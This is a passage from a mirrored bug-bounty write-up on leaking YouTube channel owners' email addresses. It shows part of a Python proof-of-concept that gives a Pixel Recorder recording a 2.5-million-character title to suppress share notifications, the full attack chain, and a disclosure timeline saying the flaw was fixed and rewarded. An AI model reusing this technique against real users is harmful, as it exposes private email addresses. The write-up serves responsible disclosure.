    <span class="hljs-keyword">return</span> response[<span class="hljs-string">&quot;recording&quot;</span>][<span class="hljs-string">&quot;uuid&quot;</span>]

<span class="hljs-keyword">def</span> <span class="hljs-title function_">update_recording_title</span>(<span class="hljs-params">share_id: <span class="hljs-built_in">str</span></span>):
    x = <span class="hljs-string">&#x27;X&#x27;</span>*<span class="hljs-number">2500000</span> <span class="hljs-comment"># 2.5 million char long title name!</span>
    payload = <span class="hljs-string">f&#x27;[&quot;<span class="hljs-subst">{share_id}</span>&quot;,&quot;<span class="hljs-subst">{x}</span>&quot;]&#x27;</span>
    response = requests.post(BASE_URL + <span class="hljs-string">&quot;UpdateRecordingTitle&quot;</span> + <span class="hljs-string">&quot;?alt=json&quot;</span>, headers=headers, data=payload)
    <span class="hljs-keyword">if</span> response.status_code != <span class="hljs-number">200</span>:
        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;unknown error when updating recording title: &quot;</span>, response.json())
        exit(<span class="hljs-number">1</span>)

<span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():
    share_id = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;Enter share ID: &quot;</span>)
    headers[<span class="hljs-string">&quot;Cookie&quot;</span>] = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;Cookie header:&quot;</span> )
    headers[<span class="hljs-string">&quot;Authorization&quot;</span>] = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;Authorization header: &quot;</span>)
    uuid = get_recording_uuid(share_id)
    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;UUID:&quot;</span>, uuid)
    update_recording_title(uuid)
    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Updated recording title successfully.&quot;</span>)

<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:
    main()</code></pre><p>... and the recording title was now <strong>2.5 million letters long!</strong> There wasn&#39;t any server-side limit to the length of a recording name.<br></br></p>
<p><img src="/assets/leaking-youtube-emails/long_recording_name.png" alt=""  /><br></br></p>
<p>Trying to share the recording with a different test user... <strong>bingo!</strong> No notification email.<br></br></p>
<p><img src="/assets/leaking-youtube-emails/no_gmail_notification.png" alt=""  /></p>
<h3 id="putting-it-all-together">Putting it all together</h3><p>We basically have the full attack chain, we just have to put it together.</p>
<ul>
<li>Leak the obfuscated Gaia ID of the YouTube channel from the Innertube endpoint <code>/get_item_context_menu</code></li>
<li>Share the Pixel recording with an extremely long name with the target to convert the Gaia ID to an email</li>
<li>Remove the target from the Pixel recording (cleanup)</li>
</ul>
</br>

<p>Here&#39;s a POC of the exploit in action:</p>
<iframe src="https://www.youtube.com/embed/nuZiiKVej84" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>

<h3 id="timeline">Timeline</h3><ul>
<li>2024-09-15 - Report sent to vendor</li>
<li>2024-09-16 - Vendor triaged report</li>
<li>2024-09-16 - üéâ <strong>Nice catch!</strong></li>
<li>2024-10-03 - Panel marks it as duplicate of existing-tracked bug, does botched patch of initial YouTube obfuscated Gaia ID disclosure</li>
<li>2024-10-03 - Clarified to vendor that they haven&#39;t recognized Pixel recorder as vulnerability itself (since obfuscated Gaia IDs are leaked for Google Maps/Play reviewers) and provided vendor a work-around method to once again leak YouTube channel obfuscated Gaia IDs</li>
<li>2024-11-05 - <strong>Panel awards $3,133.</strong> Rationale: Exploitation likelihood is medium. Issue qualified as an abuse-related methodology with high impact.</li>
<li>2024-12-03 - Product team sent report back to panel for additional reward consideration, coordinates disclosure for 2025-02-03</li>
<li>2024-12-12 - <strong>Panel awards an additional $7,500.</strong> Rationale: Exploitation likelihood is high. Issue qualified as an abuse-related methodology with high impact. Applied 1 downgrade from the base amount due to complexity of attack chain required.</li>
<li>2025-01-29 - Vendor requests extension for disclosure to 2025-02-02</li>
<li>2025-02-09 - Confirm to vendor that both parts of the exploit have been fixed (T+147 days since disclosure)</li>
<li>2025-02-12 - Report disclosed</li>
</ul>
</div> <footer class="article-footer" data-astro-cid-wrgicudb> <div class="action-row" data-astro-cid-wrgicudb> <a href="https://brutecat.com/articles/leaking-youtube-emails" target="_blank" rel="noopener noreferrer" class="read-original-btn" data-astro-cid-wrgicudb>
ÈòÖËØªÂéüÊñá ‚Üó
</a> </div> <div class="back-to-list" data-astro-cid-wrgicudb> <a href="/reading-list" class="back-link" data-astro-cid-wrgicudb>‚Üê ËøîÂõûËÆ¢ÈòÖÂàóË°®</a> </div> </footer> </article> </div>  </main> <footer class="site-footer" aria-label="Site footer" data-astro-cid-sz7xmlte> <div class="footer-content" data-astro-cid-sz7xmlte> <p class="footer-text" data-astro-cid-sz7xmlte>
&copy; 2026 AstroBlog
</p> <p class="footer-text" data-astro-cid-sz7xmlte>
Built with  <a href="https://astro.build/" target="_blank" rel="noopener noreferrer" class="footer-link" data-astro-cid-sz7xmlte>
Astro
</a> </p> </div> </footer>  </body></html> 